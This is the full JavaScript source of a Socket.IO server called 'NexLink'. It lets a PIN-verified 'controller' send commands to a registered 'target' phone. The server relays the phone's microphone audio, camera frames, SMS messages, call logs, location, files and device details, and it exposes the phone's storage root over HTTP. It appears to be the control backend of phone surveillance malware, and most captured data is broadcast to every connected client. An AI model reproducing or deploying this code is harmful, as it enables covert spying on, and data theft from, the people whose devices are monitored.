const express = require("express");
const http = require("http");
const cors = require("cors");
const { Server } = require("socket.io");

const app = express();
app.use(cors());
app.use("/files", express.static("/storage/emulated/0"));

const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: "*" },
  maxHttpBufferSize: 1e8
});

let devices = {};
let controllerMap = {};

// 🔐 NEW
let devicePins = {};          // targetId → PIN
let verifiedControllers = {}; // controllerId → targetId

io.on("connection", (socket) => {

  console.log("🟢 Device connected:", socket.id);

  /* -----------------------------
     REGISTER DEVICE
  ------------------------------ */
  socket.on("register-device", (data) => {

    devices[socket.id] = {
      id: socket.id,
      name: data.name,
      type: data.type,
    };

    console.log("📱 Registered:", devices[socket.id]);

    // 🔐 GENERATE PIN FOR TARGET
    if (data.type === "target") {
      const pin = Math.floor(100000 + Math.random() * 900000).toString();

      devicePins[socket.id] = pin;

      console.log("🔐 PIN for", socket.id, ":", pin);

      io.to(socket.id).emit("device-pin", { pin });
    }

    io.emit("device-list", Object.values(devices));
  });

  /* -----------------------------
     🔐 VERIFY PIN
  ------------------------------ */
  socket.on("verify-pin", ({ pin }) => {

    const targetEntry = Object.entries(devicePins)
      .find(([id, p]) => p === pin);

    if (!targetEntry) {
      console.log("❌ Invalid PIN");
      socket.emit("pin-status", { success: false });
      return;
    }

    const targetId = targetEntry[0];

    verifiedControllers[socket.id] = targetId;

    console.log("✅ Controller verified:", socket.id, "→", targetId);

    socket.emit("pin-status", {
      success: true,
      targetId: targetId
    });
  });

  /* -----------------------------
     COMMAND FROM CONTROLLER
  ------------------------------ */
  socket.on("send-command", (data) => {

    const targetId = data.targetId;

    console.log("📤 Command from controller:", data);

    // 🔐 AUTH CHECK
    const allowedTarget = verifiedControllers[socket.id];

    if (allowedTarget !== targetId) {
      console.log("❌ Unauthorized command attempt");
      return;
    }

    if (devices[targetId]) {

      controllerMap[targetId] = socket.id;

      console.log("🎯 Mapping saved:", targetId, "→", socket.id);

      io.to(targetId).emit("receive-command", data.command);

    } else {
      console.log("❌ Target NOT FOUND:", targetId);
    }
  });

  /* -----------------------------
     🎤 MIC AUDIO
  ------------------------------ */
  socket.on("mic-audio", (data) => {

    console.log("🎤 Mic audio received");

    const controllerSocketId = controllerMap[socket.id];

    if (controllerSocketId) {
      io.to(controllerSocketId).emit("mic-audio", data);
    }
  });

  /* -----------------------------
     FILE MANAGER
  ------------------------------ */
  socket.on("file-list", (data) => {
    io.emit("file-list", data);
  });

  socket.on("file-download", (data) => {
    io.emit("file-download", data);
  });

  /* -----------------------------
     LOCATION
  ------------------------------ */
  socket.on("location-data", (data) => {
    io.emit("location-data", data);
  });

  /* -----------------------------
     DEVICE INFO
  ------------------------------ */
  socket.on("device-info", (data) => {
    io.emit("device-info", data);
  });

  /* -----------------------------
     CALL LOGS
  ------------------------------ */
  socket.on("call-logs", (data) => {

    let logs = [];

    try {
      logs = JSON.parse(data);
    } catch (e) {
      console.log("❌ JSON parse error:", e);
      return;
    }

    io.emit("call-logs", logs);
  });

  /* -----------------------------
     CAMERA STREAM
  ------------------------------ */
  socket.on("camera-frame", (data) => {
    io.emit("camera-frame", data);
  });

  /* -----------------------------
     SMS BLOCK
  ------------------------------ */
  socket.on("sms-data", (data) => {

    let smsArray = [];

    if (typeof data === "string") {
      try {
        smsArray = JSON.parse(data);
      } catch (e) {
        console.log("❌ Parse error:", e);
        return;
      }
    } else if (Array.isArray(data)) {
      smsArray = data;
    } else {
      smsArray = [data];
    }

    const controllerSocketId = controllerMap[socket.id];

    if (controllerSocketId) {
      io.to(controllerSocketId).emit("sms-data", smsArray);
    }
  });

  /* -----------------------------
     DISCONNECT
  ------------------------------ */
  socket.on("disconnect", () => {

    console.log("🔴 Device disconnected:", socket.id);

    delete devices[socket.id];
    delete controllerMap[socket.id];
    delete devicePins[socket.id];
    delete verifiedControllers[socket.id];

    io.emit("device-list", Object.values(devices));
  });

});

server.listen(3000, () => {
  console.log("🚀 NexLink Server Running on Port 3000");
});